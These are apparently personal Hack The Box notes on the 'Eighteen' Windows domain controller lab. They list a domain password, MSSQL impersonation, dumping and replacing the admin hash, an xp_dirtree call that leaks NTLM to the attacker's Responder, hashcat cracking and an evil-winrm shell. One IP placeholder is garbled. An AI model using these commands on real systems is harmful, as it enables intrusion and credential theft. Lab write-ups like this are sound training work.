# HTB — Eighteen

## Target Info
- IP: 10.129.3.112 (resets frequently)
- OS: Windows Server (Domain Controller)
- Difficulty: Easy
- Date: 2026-03-04

---

## Ports Found
| Port | Service | Notes |
|------|---------|-------|
| 80 | HTTP - IIS 10.0 | No HTTPS — plaintext traffic |
| 1433 | MSSQL 2022 | Microsoft SQL Server |
| 5985 | WinRM | Remote shell access |

---

## Key Observations
- Domain Controller: DC01.eighteen.htb
- Web app: Flask Financial Planner v1.0
- Backend database: MSSQL (dc01.eighteen.htb)
- HTTP only — no HTTPS (security finding)
- Admin panel exists at /admin

---

## Web Enumeration

### Gobuster Results
- /admin → redirects to /login (admin panel exists)
- /dashboard → requires auth
- /features → public
- /login → public
- /register → public

### Application Behaviour
- Register and login functionality
- Financial dashboard after login
- Admin panel restricted to admin users
- SQLi confirmed via Burp (single quote breaks session cookie)

---

## Credentials
| Username | Password | Type | Access |
|----------|----------|------|--------|
| kevin | iNa2we6haRj2gaw! | Domain account | WinRM + MSSQL |
| admin | (hash in DB) | Web app | Admin panel |
| appdev | (MSSQL login) | SQL login | financial_planner DB |
| mssqlsvc | (not cracked) | Service account | Runs MSSQL service |

---

## Attack Chain

### Step 1 — MSSQL Access (kevin)
```bash
impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@<IP>
```

### Step 2 — User Impersonation
```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
```

### Step 3 — Dump Users Table
```sql
SELECT * FROM users;
-- Found: admin hash (pbkdf2:sha256)
```

### Step 4 — Replace Admin Password Hash
```bash
# Generate new hash in terminal
python3 -c "from werkzeug.security import generate_password_hash; print(generate_password_hash('password123'))"
```
```sql
-- Update in MSSQL
UPDATE users SET password_hash='<new_hash>' WHERE username='admin';
```

### Step 5 — Login as Admin
- URL: http://eighteen.htb/login
- Username: admin
- Password: password123

### Step 6 — NTLMv2 Hash Capture (Responder)
```bash
# Terminal 1 — Start Responder
sudo responder -I tun0

# Terminal 2 — Trigger authentication via MSSQL
EXEC master..xp_dirtree '\\<Tून0_IP>\share';
```
- Captured: EIGHTEEN\mssqlsvc NTLMv2 hash
- Crack attempt: hashcat -m 5600 hash.txt rockyou.txt
- Result: Not in rockyou.txt

### Step 7 — WinRM Shell
```bash
evil-winrm -i <IP> -u kevin -p 'iNa2we6haRj2gaw!'
```
- Shell obtained but unstable (machine resets)

---

## Vulnerabilities Found
| Vulnerability | Location | Impact |
|---------------|----------|--------|
| No HTTPS | Web app | Credential interception |
| SQL Injection | Login form | Database access |
| MSSQL user impersonation | appdev login | DB privilege escalation |
| xp_dirtree NTLM leak | MSSQL | NTLMv2 hash capture |
| Weak admin hash | Database | Admin panel takeover |

---

## Tools Used
| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Directory enumeration |
| Burp Suite | Traffic interception, SQLi testing |
| impacket-mssqlclient | MSSQL shell |
| responder | NTLMv2 hash capture |
| hashcat | Hash cracking |
| evil-winrm | Windows remote shell |

---

## Lessons Learned
- Always check WinRM (5985) — instant shell with valid creds
- MSSQL user impersonation can escalate DB privileges
- xp_dirtree forces NTLM authentication back to attacker
- Flask apps use werkzeug password hashing (pbkdf2/scrypt)
- Domain Controllers run critical services as domain accounts
- Machine instability on HTB is common — reset and adapt

---

## Status
- [x] Initial foothold (MSSQL + web admin)
- [x] NTLMv2 hash captured
- [ ] User flag
- [ ] Root flag
- [ ] PrivEsc (incomplete due to machine instability)

---

## Attack Path (Visual)
```
Nmap → Found ports 80, 1433, 5985
  ↓
Web enum → Admin panel, SQLi confirmed
  ↓
MSSQL (kevin) → Impersonate appdev
  ↓
Dump users table → Replace admin hash
  ↓
Admin panel access
  ↓
xp_dirtree → Responder → NTLMv2 hash (mssqlsvc)
  ↓
WinRM shell (kevin) ← unstable
  ↓
[PrivEsc pending]
```